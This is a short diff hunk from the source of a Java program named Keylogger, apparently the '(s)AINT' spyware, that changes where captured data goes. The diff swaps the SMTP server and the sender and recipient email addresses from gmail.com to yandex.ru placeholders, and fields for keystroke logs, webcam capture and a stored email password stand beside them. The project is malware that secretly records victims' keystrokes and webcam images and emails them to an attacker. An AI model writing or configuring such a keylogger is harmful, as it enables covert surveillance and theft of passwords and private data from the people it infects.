@@ -62,10 +62,10 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
     private static String nameFileCam;
     private static String logs = "";
     private static String logs_send = "";
-    private static String smtp = "smtp.gmail.com";
-    private static String email_from = "email@gmail.com";
+    private static String smtp = "smtp.yandex.ru";
+    private static String email_from = "email@yandex.ru";
     private static String email_password = "passwordemail";
-    private static String email_to = "email@gmail.com";
+    private static String email_to = "email@yandex.ru";
     private static String subject = "(s)AINT";
     private static String port = "";
     private static int cam_width = 640;
